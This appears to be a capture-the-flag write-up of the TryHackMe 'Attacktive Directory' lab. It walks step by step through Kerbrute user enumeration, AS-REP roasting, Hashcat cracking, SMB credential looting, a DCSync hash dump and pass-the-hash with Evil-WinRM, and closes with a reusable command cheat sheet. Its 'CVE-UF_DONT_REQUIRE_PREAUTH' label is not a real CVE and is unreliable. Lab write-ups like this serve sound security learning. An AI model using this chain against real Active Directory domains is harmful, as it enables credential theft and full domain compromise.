# Attacktive Directory - TryHackMe

> **Kill Chain Summary**:
> Network Reconnaissance (DNS 53, Kerberos 88, SMB 445, LDAP 389, WinRM 5985) -> Domain Controller Fingerprinting (`spookysec.local`) -> Unauthenticated User Enumeration with Kerbrute -> AS-REP Roasting via Impacket (`svc-admin`) -> Offline Ticket Cracking with Hashcat (mode 18200) -> Authenticated SMB Share Enumeration -> Base64 Credential Recovery from `backup_credentials.txt` -> DCSync Domain Database Replication via Impacket secretsdump -> Extracting Administrator NTLM Hash -> Pass-The-Hash Remote Management via Evil-WinRM -> Domain Administrator Access.

| Property | Value |
| :--- | :--- |
| **Target Name** | Attacktive Directory |
| **Platform** | TryHackMe |
| **OS** | Windows Server 2019 (Domain Controller) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Kerbrute User Enumeration, AS-REP Roasting, Hashcat Kerberos Cracking, Authenticated SMB Enumeration, DCSync Attack (secretsdump), Pass-The-Hash (Evil-WinRM) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.180.120 10.10.180.120
```

**Open Ports:**

| Port | Service | Role in Active Directory |
| :--- | :--- | :--- |
| 53/tcp | DNS | Active Directory integrated domain DNS |
| 80/tcp | HTTP | Microsoft IIS 10.0 default page |
| 88/tcp | Kerberos | Kerberos authentication (Key Distribution Center) |
| 135/tcp | MSRPC | Microsoft RPC endpoint mapper |
| 139/445/tcp | SMB | Server Message Block (SYSVOL, NETLOGON, shares) |
| 389/3268/tcp | LDAP | Lightweight Directory Access Protocol / Global Catalog |
| 3389/tcp | RDP | Terminal Services remote desktop |
| 5985/tcp | WinRM | Windows Remote Management (HTTP) |

> [!NOTE] Concept: Identifying an Active Directory Domain Controller
> The simultaneous presence of **DNS (53)**, **Kerberos (88)**, and **LDAP (389)** is the defining footprint of a Windows Domain Controller (DC).

Inspecting LDAP banners reveals the domain naming context: **`spookysec.local`**.

Map the domain to the local `/etc/hosts` file on Kali:

```bash
echo "10.10.180.120 spookysec.local" | sudo tee -a /etc/hosts
```

---

## 2. Initial Access

### 2.1 Unauthenticated User Enumeration via Kerbrute

Kerberos pre-authentication errors can be leveraged to enumerate valid Active Directory usernames without credentials.

Using `kerbrute` with a common Active Directory user dictionary:

```bash
./kerbrute userenum -d spookysec.local --dc 10.10.180.120 users.txt
```

```text
[+] VALID USERNAME:       james@spookysec.local
[+] VALID USERNAME:       svc-admin@spookysec.local
[+] VALID USERNAME:       robin@spookysec.local
[+] VALID USERNAME:       darkstar@spookysec.local
[+] VALID USERNAME:       administrator@spookysec.local
[+] VALID USERNAME:       backup@spookysec.local
[+] VALID USERNAME:       paradox@spookysec.local
[+] VALID USERNAME:       ori@spookysec.local
```

Save the discovered valid usernames to `valid_users.txt`.

### 2.2 AS-REP Roasting Exploitation

> [!NOTE] Concept: AS-REP Roasting (CVE-UF_DONT_REQUIRE_PREAUTH)
> When an Active Directory account has the `Do not require Kerberos preauthentication` attribute enabled (`DONT_REQ_PREAUTH`), any client can request an AS-REP ticket for that user from the Key Distribution Center (KDC) without supplying credentials. The KDC returns an encrypted message containing the session key encrypted with the user's password hash, which can be cracked offline.

Query the KDC for AS-REP tickets using Impacket's `GetNPUsers.py`:

```bash
impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.180.120 -usersfile valid_users.txt -request -outputfile asrep_hashes.txt
```

```text
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@spookysec.local:409...
```

The account `svc-admin` is configured without pre-authentication and returns a crackable hash.

### 2.3 Cracking the AS-REP Ticket

Crack the Kerberos ticket using Hashcat mode 18200:

```bash
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
$krb5asrep$23$svc-admin@spookysec.local:...:management2005
```

The plaintext password for `svc-admin` is recovered: **`management2005`**.

---

## 3. Privilege Escalation

### 3.1 Authenticated SMB Share Enumeration

Using the authenticated credentials of `svc-admin`, enumerate domain shares:

```bash
smbclient -L //10.10.180.120/ -U svc-admin
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

Connecting to the `backup` share:

```bash
smbclient //10.10.180.120/backup -U svc-admin
smb: \> ls
  backup_credentials.txt              A       48  Sat Apr  4 15:08:44 2020
smb: \> get backup_credentials.txt
```

Reading `backup_credentials.txt`:

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoding the Base64 string:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

```text
backup@spookysec.local:backup2517860
```

Recovered backup credentials:
- **Username:** `backup`
- **Password:** `backup2517860`

---

### Domain Takeover and Privilege Escalation

### 4.1 DCSync Attack via Impacket secretsdump

> [!NOTE] Concept: DCSync Attack
> Accounts assigned to domain backup or replication roles frequently hold the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended directory rights. These permissions allow the account to simulate a Domain Controller using the Directory Replication Service Remote Protocol (MS-DRSR) and request password hashes from `NTDS.dit`.

Execute `impacket-secretsdump` using the `backup` credentials:

```bash
impacket-secretsdump spookysec.local/backup:backup2517860@10.10.180.120
```

```text
[*] Target does not support SMB v1, using SMB v2/v3
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:27083a152e97149a4e402371be1d3558:::
...
```

The NTLM hash for the Domain Administrator is recovered:
- **Username:** `Administrator`
- **NTLM Hash:** `0e0363213e37b94221497260b0bcb4fc`

### 4.2 Pass-The-Hash via Evil-WinRM

Because WinRM (port 5985) is exposed on the Domain Controller, authenticate directly using the extracted NTLM hash via Pass-The-Hash:

```bash
evil-winrm -i 10.10.180.120 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
spookysec\administrator
```

Retrieve the domain proof flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Kerbrute Unauthenticated User Enumeration
./kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_LIST>

# AS-REP Roasting with Impacket
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile <USER_LIST> -request

# Hashcat AS-REP Hash Cracking
hashcat -m 18200 -a 0 <HASH_FILE> <WORDLIST>

# DCSync Domain NTDS Database Extraction
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>

# Pass-The-Hash via Evil-WinRM
evil-winrm -i <DC_IP> -u <USER> -H <NTLM_HASH>
```

---

## 5. Key Takeaways and Lessons Learned

1. **Active Directory Identification:** Spotting ports 53, 88, 389, and 445 immediately signals an Active Directory environment. The standard reconnaissance workflow begins with user enumeration via Kerbrute rather than generic web brute-forcing.
2. **AS-REP Roasting Vulnerability:** Service accounts (`svc-*`) often disable Kerberos pre-authentication for legacy script compatibility. Querying accounts with `GetNPUsers.py` provides immediate, low-noise credential extraction.
3. **Replication Privilege Auditing:** Any account holding replication privileges (such as backup operators or migration service accounts) possesses the ability to request complete password hashes via DCSync, equating to full Domain Admin compromise.

---

#tryhackme #windows #active-directory #domain-controller #kerbrute #asrep-roasting #impacket #secretsdump #dcsync #pass-the-hash #evil-winrm #privesc